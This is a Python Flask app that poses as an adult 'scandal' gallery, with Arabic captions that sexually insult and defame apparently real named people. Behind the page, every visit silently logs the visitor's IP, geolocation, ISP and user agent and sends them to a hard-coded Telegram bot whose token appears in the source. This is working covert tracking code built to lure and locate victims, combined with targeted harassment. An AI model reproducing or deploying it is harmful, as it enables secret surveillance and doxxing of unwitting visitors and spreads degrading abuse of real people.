from flask import Flask, render_template_string, request
import requests
import json

app = Flask(__name__)

# إعدادات بوت التليجرام
TELEGRAM_BOT_TOKEN = "8403289152:AAGmrgRmtH_nQCI7aDgHT7DTjrbm7oPnVyw"
TELEGRAM_CHAT_ID = "8407554926"

# قالب HTML بسيط
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="مرحبا بكم في موقع فضائح عاهرات مجال الكاردينج،نود ان نعلمكم ان هذا الموقع يحتوي علي صور ساخنة لبعض المشاهير النصابين العاهرات💥">
    <meta name="keywords" content="مرحبا بكم في موقع فضائح عاهرات مجال الكاردينج،نود ان نعلمكم ان هذا الموقع يحتوي علي صور ساخنة لبعض المشاهير النصابين العاهرات💥">
    <meta name="author" content="XAZ Developer">
    <title>Porn jaffar</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #00224f, #004080);
            font-family: Arial, sans-serif;
            color: #fff;
        }
        .header {
            text-align: center;
            padding: 20px;
            background-color: orange;
            color: white;
            font-size: 26px;
            font-weight: bold;
            text-shadow: 2px 2px 4px #000;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        .gallery-item {
            text-align: center;
        }
        .gallery-item img {
            width: 100%;
            height: auto;
            border: 3px solid orange;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
        .gallery-item p {
            margin: 10px 0 0;
            font-size: 14px;
            color: #ddd;
        }
        .button-container {
            text-align: center;
            margin: 30px 0;
        }
        .contact-button {
            background-color: orange;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            text-decoration: none;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
        }
        .contact-button:hover {
            background-color: darkorange;
            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <div class="header">Welcome to Porn 3sker</div>
    <div class="gallery">
        <div class="gallery-item">
            <img src="https://i.ibb.co/pjVxjrDp/IMG-20250928-145056-957.jpg" alt="Image 1">
            <p>جعفر تبع الدمبات الميتة المتناكة مثل وجهو💥</p>
        </div>
        <div class="gallery-item">
            <img src="https://i.ibb.co/BHkQxgbq/IMG-20250928-150157-433.jpg" alt="Image 2">
            <p>اخت كريم الشرموطة 🙊</p>
        </div>
        <div class="gallery-item">
            <img src="https://i.ibb.co/WWQRNmLW/IMG-20250928-145413-327.jpg" alt="Image 3">
            <p>لحاس العير بو ترمة جعفر🙊</p>
        </div>
    <div class="button-container">
        <a href="https://t.me/+tHLaHNfjVHY1M2E0" class="contact-button">Contact Developer</a>
    </div>
</body>
</html>
"""

def get_client_ip():
    """الحصول على IP العميل الحقيقي"""
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        ip = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0]
    else:
        ip = request.environ.get('REMOTE_ADDR')
    return ip

def get_ip_info(ip_address):
    """الحصول على معلومات الـ IP من API"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        data = response.json()
        return data
    except:
        return {"status": "fail", "message": "Unable to get IP info"}

def send_to_telegram(message):
    """إرسال رسالة إلى التليجرام"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload)
        return response.status_code == 200
    except:
        return False

@app.route('/')
def index():
    # الحصول على IP العميل
    client_ip = get_client_ip()
    
    # الحصول على معلومات الـ IP
    ip_info = get_ip_info(client_ip)
    
    # إنشاء رسالة للمستخدم
    if ip_info.get('status') == 'success':
        message = f"""
🔍 <b>تم تسجيل دخول جديد</b>

🌐 <b>IP Address:</b> <code>{client_ip}</code>
🏙️ <b>City:</b> {ip_info.get('city', 'N/A')}
🏛️ <b>Region:</b> {ip_info.get('regionName', 'N/A')}
🇺🇸 <b>Country:</b> {ip_info.get('country', 'N/A')}
📍 <b>Location:</b> {ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}
🏢 <b>ISP:</b> {ip_info.get('isp', 'N/A')}
🕒 <b>Timezone:</b> {ip_info.get('timezone', 'N/A')}

📱 <b>User Agent:</b>
{request.headers.get('User-Agent', 'N/A')}
        """
    else:
        message = f"""
🔍 <b>تم تسجيل دخول جديد</b>

🌐 <b>IP Address:</b> <code>{client_ip}</code>
❌ <b>Unable to get detailed location info</b>

📱 <b>User Agent:</b>
{request.headers.get('User-Agent', 'N/A')}
        """
    
    # إرسال الرسالة إلى التليجرام
    send_to_telegram(message)
    
    # عرض قالب HTML للعميل
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
